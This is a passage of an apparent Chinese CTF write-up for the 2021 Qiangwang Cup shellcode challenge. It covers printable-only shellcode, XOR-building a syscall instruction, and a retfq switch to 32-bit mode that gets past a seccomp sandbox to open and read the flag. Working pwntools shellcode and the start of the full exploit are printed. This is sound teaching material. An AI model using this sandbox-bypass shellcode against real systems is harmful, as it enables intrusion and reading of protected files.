class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">1.数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line">2.算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">3.逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">4.比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">5.转移指令:</span><br><span class="line">push 56h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, 43h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line">6.交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">xor byte ptr [esp], ah // al ^= ah</span><br><span class="line">xor ah, byte ptr [esp] // ah ^= al</span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line">7.清零:</span><br><span class="line">push 44h</span><br><span class="line">pop eax</span><br><span class="line">sub al, 44h ; eax = 0</span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = 0</span><br></pre></td></tr></table></figure>
+
+<p>同时因为x86中的<code>int 0x80</code>和x64中的<code>syscall</code>指令也在不可见字符范围中，所以我们不能直接输入，要通过<code>xor and sub inc dec</code>这样的算术运算来使得一些shellcode操作后变成<code>int 0x80</code>或<code>syscall</code></p>
+<p>异或构造<code>syscall</code>：<code>syscall</code>的机器码对应的16进制为<code>0F 05</code>，<code>push rdx;pop rdx;</code>的机器码对应的16进制分别为<code>0x52</code>和<code>0x5a</code>，分别用<code>0x5d</code>和<code>0x5f</code>去异或即可得到<code>0F 05</code>，如下：</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>
+
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>
+
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>
+
+<p>从<code>0x7f5031b3601d</code>处开始到<code>0x7f5031b36026</code>，一共执行完的两步异或使得原本在<code>[rax+0x31]</code>和<code>[rax+0x32]</code>处的指令<code>push rdx;pop rdx;</code>变成了指令<code>syscall</code></p>
+<h4 id="retfq指令"><a href="#retfq指令" class="headerlink" title="retfq指令"></a>retfq指令</h4><p>程序通过cs寄存器来确定以64/32位模式来运行，<code>cs = 0x23</code>对应32位模式，<code>cs = 0x33</code>对应64位模式，而retfq则是用来修改cs寄存器的，其功能相当于<code>ret;pop cs</code>。</p>
+<p>更详细的可以搜索这个指令的相关或者<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645">shellcode 的艺术</a></p>
+<h4 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h4><p>当沙箱的第一行是<code>A = sys_number</code>时，我们可以通过切换程序运行的位数来调用到在另一个位数中相同调用号的函数。如下图中，程序正常时工作在64位模式下，则这个沙箱过滤的就是64位下这些函数的系统调用号，也就是只允许调用<code>5（fstat）、37（alarm）、0（read）、9（mmap）、231（exit_group）</code>这几个系统调用，但是这里沙箱是只允许调用这些<strong>调用号</strong>，而不是只允许调用这些<strong>函数</strong>，同时我们知道32位和64位下的系统调用号对应的是不同的函数，例如64位中5号系统调用对应的是fstat函数，但是32位中5号系统调用对应的是open函数。所以我们有时就能通过切换程序工作位数的方法来调用到一些沙箱原本过滤掉的函数。</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class>
+
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>保护</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/checksec.jpg" class>
+
+<p>沙箱如下</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/seccomp.jpg" class>
+
+<p>程序主逻辑如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v22; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v26; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v30; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v34; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v37; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v38; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v42; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">32</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">21</span>;</span><br><span class="line">  v15 = <span class="number">6</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">5</span>;</span><br><span class="line">  v18 = <span class="number">21</span>;</span><br><span class="line">  v19 = <span class="number">5</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">37</span>;</span><br><span class="line">  v22 = <span class="number">21</span>;</span><br><span class="line">  v23 = <span class="number">3</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">4</span>;</span><br><span class="line">  v26 = <span class="number">21</span>;</span><br><span class="line">  v27 = <span class="number">3</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">21</span>;</span><br><span class="line">  v31 = <span class="number">2</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">9</span>;</span><br><span class="line">  v34 = <span class="number">21</span>;</span><br><span class="line">  v35 = <span class="number">1</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">231</span>;</span><br><span class="line">  v38 = <span class="number">6</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">6</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = &amp;v10;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, arg3, v2);</span><br><span class="line">  v4 = sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v5 = sys_read(<span class="number">0</span>, v4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v4[v5 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v6 = v5 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">31</span> || v4[i] == <span class="number">127</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  (v4)();	<span class="comment">//这里call rbx</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  v8 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序逻辑很简单，先mmap一段rwx的内存，然后往这段内存中输入，程序检查我们的输入是否在<code>&gt;31 &amp;&amp; &lt;127</code>的范围内，如果不在则直接退出，如果检查通过则直接执行。</p>
+<p>显然这是一道构造shellcode的题目，虽然我们可以通过alpha3和ae64等工具直接构造出符合条件的shellcode，但是显然因为沙箱的存在，所以我们需要手动构造。</p>
+<p>沙箱只允许我们调用几个函数，可见其中我们可以利用的只有read，没有输出函数我们可以通过侧信道攻击爆破出shellcode，但是我们需要先解决连open都没有的问题。这时就要利用绕过沙箱的技巧，因为沙箱中的第一个函数fstat的调用号是5，而32位中5号系统调用对应open函数，所以只要我们将程序切换到32位模式下，就可以调用open函数了，然后再切换回来read和爆破即可。</p>
+<p>但是因为retfq指令会先ret，同时ret之后程序按照32位模式来对齐地址和执行指令，所以在原本的64位模式下的地址中执行指令会出错，所以我们还先应该mmap一段固定的地址，来给32位的指令预留位置，mmap完之后调用read将我们的x86open和再次切换回64位的retfq指令写进这个地址中，完成后在retfq的同时跳转到这个地址执行。（因为32位模式下我们调用不了read，所以我们open完之后仍然需要返回到64位将flag写出来）</p>
+<p>接下来编写可见字符范围内的read和mmap，在尝试构造的过程中，如果程序是这样的</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-1.jpg" class>
+
+<p>则说明我们的输入通过了检查，因为程序是异常退出的，但如果是这样的</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-2.jpg" class>
+
+<p>则说明我们的输入没有通过检查，因为程序是调用exit_group正常退出的</p>
+<p>mmap需要按照这样调用：<code>mmap(0x40404040,0x7e,7,34,0,0)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push rdx</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x7e</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    sub al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x2f],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x30],cl</span></span><br><span class="line"><span class="string">    /* set rcx */</span></span><br><span class="line"><span class="string">    push 0x22</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    /* set r8 */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    /* set r9 */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x49</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x52],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x53],cl</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  push rbx</span></span><br><span class="line"><span class="string">  pop rax</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  xor al,0x40</span></span><br><span class="line"><span class="string">  push 0x72</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x68</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x47</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x48</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x23</span></span><br><span class="line"><span class="string">  push 0x40404040</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append</span><br><span class="line">p.send(asm(payload))</span><br></pre></td></tr></table></figure>
+
+<p>前面我们说过利用<code>push rdx;pop rdx;</code>来构造shellcode，因为执行shellcode时call的是rbx，所以可以用rbx作为基址找到这两条指令的位置。</p>
+<img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E5%88%86%E6%9E%90-3.jpg" class>
+
+<p>接下来构造x86下的open、返回到64位的retfq、返回64位之后用来读出flag的read以及一部分用来侧信道攻击的code，要注意这部分shellcode并不会通过程序的检查，因为这部分是用我们调用的read写进去的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* open(&quot;flag&quot;,0,0) */</span></span><br><span class="line"><span class="string">    mov esp,0x40404040</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx,eax</span></span><br><span class="line"><span class="string">    /* retfq */</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x40404064</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    /* read */</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,0x404040a0</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>到这里题目就基本完成了，最后爆破一下就行，完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 